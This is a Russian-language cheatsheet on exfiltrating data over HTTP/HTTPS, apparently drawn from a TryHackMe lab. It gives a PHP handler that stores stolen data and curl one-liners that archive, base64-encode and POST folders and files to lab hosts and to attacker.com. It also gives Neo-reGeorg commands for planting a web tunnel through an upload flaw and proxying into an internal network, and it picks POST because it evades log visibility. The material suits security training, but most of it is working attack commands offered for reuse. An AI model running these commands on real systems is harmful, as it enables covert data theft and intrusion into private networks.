# DATA EXFILTRATION ЧЕРЕЗ HTTP/HTTPS — Cheatsheet

## Что это

Использование HTTP/HTTPS протоколов для вывода данных из скомпрометированной сети наружу. Трафик маскируется под легитимный веб-трафик, что затрудняет обнаружение.


## Почему POST, а не GET

| GET | POST |
|-----|------|
| Данные в URL (видны в логах) | Данные в теле запроса (не видны в логах) |
| Кэшируется | Не кэшируется |
| Остаётся в истории браузера | Не остаётся |
| Можно добавить в закладки | Нельзя |

**Вывод:** Для exfiltration используем POST.


## Как работает HTTP Exfiltration

1. Атакующий поднимает веб-сервер с обработчиком POST-запросов (например, `contact.php`).
2. На скомпрометированной машине выполняется команда, которая отправляет данные на этот сервер.
3. Данные кодируются (Base64, tar, шифрование), чтобы скрыть содержимое.
4. Сервер сохраняет данные в файл.
5. Атакующий забирает данные с сервера.


## Простая PHP-обработчик (серверная часть)

```php
<?php 
if (isset($_POST['file'])) {
    $file = fopen("/tmp/http.bs64","w");
    fwrite($file, $_POST['file']);
    fclose($file);
}
?>
```

Сохраняет POST-данные в `/tmp/http.bs64`.


## Отправка данных с victim (клиентская часть)

```bash
curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

**Разбор:**
- `tar zcf - task6` — архивирует папку `task6` в stdout
- `base64` — кодирует архив в Base64
- `--data "file=..."` — отправляет POST-запрос с параметром `file`
- `http://web.thm.com/contact.php` — обработчик на сервере


## Восстановление данных на сервере

```bash
# Исправить Base64 (заменить пробелы на +)
sudo sed -i 's/ /+/g' /tmp/http.bs64

# Распаковать
cat /tmp/http.bs64 | base64 -d | tar xvfz -
```


## HTTP Tunneling (Neo-reGeorg)

### Что это

Создание HTTP-туннеля для доступа во внутреннюю сеть через скомпрометированный веб-сервер.

### Как работает

1. Генерируется клиент (`tunnel.php`, `tunnel.aspx`, `tunnel.jsp`).
2. Файл загружается на веб-сервер (через уязвимость загрузки файлов).
3. Атакующий подключается к этому файлу через `neoreg.py`.
4. Создаётся SOCKS5-прокси на локальной машине (127.0.0.1:1080).
5. Весь трафик через этот прокси идёт через веб-сервер во внутреннюю сеть.

### Генерация клиента

```bash
python3 neoreg.py generate -k thm
```

Создаются файлы в `neoreg_servers/`:
- `tunnel.php` — для PHP-серверов
- `tunnel.aspx` — для ASP.NET
- `tunnel.jsp` — для Java

### Подключение к туннелю

```bash
python3 neoreg.py -k thm -u http://uploader.thm.com/files/tunnel.php
```

### Использование туннеля

```bash
curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```

Или через `proxychains`:

```bash
proxychains curl http://172.20.0.121:80
```

---

## Преимущества HTTP Exfiltration

- Трудно отличить от легитимного трафика.
- POST-запросы не логируются в URL.
- Можно использовать HTTPS для шифрования данных.
- Нет ограничений на длину данных (в отличие от GET).

## Шпаргалка

```bash
# Отправить папку через HTTP POST
curl --data "file=$(tar zcf - folder | base64)" http://attacker.com/handler.php

# Отправить файл
curl --data "file=$(cat file | base64)" http://attacker.com/handler.php

# Восстановить на сервере
sed -i 's/ /+/g' /tmp/data.bs64
cat /tmp/data.bs64 | base64 -d | tar xvfz -

# HTTP Tunnel (Neo-reGeorg)
python3 neoreg.py generate -k password
python3 neoreg.py -k password -u http://target.com/tunnel.php
curl --socks5 127.0.0.1:1080 http://internal-ip/
```
